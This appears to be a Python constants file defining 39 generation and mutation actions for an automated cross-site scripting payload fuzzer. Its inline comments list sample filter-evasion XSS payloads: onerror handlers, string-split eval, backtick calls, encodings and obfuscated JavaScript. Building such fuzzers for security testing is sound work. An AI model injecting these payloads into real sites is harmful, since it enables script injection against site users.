ACTION_SIZE = 39

# Generation
# Basic Payload
USING_SCRIPT_TAG = 0
PATTERN2_PAYLOAD = 1
PATTERN3_PAYLOAD = 2
# JsComponent
SRC_URL = 3
IN_JAVASCRIPT = 4
JAVASCRIPT_FILE = 5
URL_VALUE = 6

# Mutation
# Prefix
MUTATE_PREFIX_SLASHBRACKET = 7
MUTATE_PREFIX_DOUBLE_QUOTE = 8
MUTATE_PREFIX_SINGLE_QUOTE = 9
MUTATE_PREFIX_DOUBLE_QUOTE_BRACKET = 10
MUTATE_PREFIX_SINGLE_QUOTE_BRACKET = 11
MUTATE_PREFIX_BRACKET = 12
MUTATE_PREFIX_COMMENT = 13
MUTATE_PREFIX_STYLE = 14
MUTATE_JS_COMMENT = 15
MUTATE_PREFIX_SINGLE_QUOTE_SEMIC = 16
MUTATE_PREFIX_DOUBLE_QUOTE_SEMIC = 17
MUTATE_PREFIX_STRING_VALUE = 18
PREFIX_ENTER = 19
INSERT_EFFECTIVE_TAG = 20

# Suffix
MUTATE_SUFFIX_HTML_COMMENT = 21
MUTATE_SUFFIX_SINGLE_QUOTATION = 22
MUTATE_SUFFIX_DOUBLE_QUOTATION = 23

# Tag
MUTATE_HTML_TAG = 24
TAG_LOWER_TO_UPPER = 25
INSERT_TAG_INTO_TAG = 26

# Attribute
TAG_ATTRIBUTE_UPPER = 27 # <IMG SRC=X onerror="alert(1);"/>

# JS Snippet
MUTATE_JAVA_SCRIPT = 28 # <script>prompt(1)</script>
DIVIDE_JAVASCRIPT = 29 # <img src=x onerror='var A = "al" + "er" + "t(1);";eval(A);'></img>
IN_JAVASCRIPT_PREFIX_SUFFIX_DOUBLE = 30 # "+alert(1)+"
IN_JAVASCRIPT_PREFIX_SUFFIX_SINGLE = 31 # '+alert(1)+'
JAVASCRIPT_NO_PARENTHESIS = 32 # <script>onerror=alert;throw 1</script>

# Entire String
URL_ENCODING = 33 # %3Cscript%3E alert(1) %3C%2Fscript%3E
HEXA_ENCODING = 34 # \74img src=0 onerror=alert(1)\76
CODE_OBFUSCATION = 35 # [][(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[
WHITE_SPACE_TO_SLASH = 36 # <img/src='x'/onerror='alert(1)'/>
MUTATE_QUOTATION_TO_BACK_TICK = 37 # <img src=x onerror=alert`1` />
MUTATE_PARENTHESIS_TO_BACK_TICK = 38 # <script>alert`1`</script>


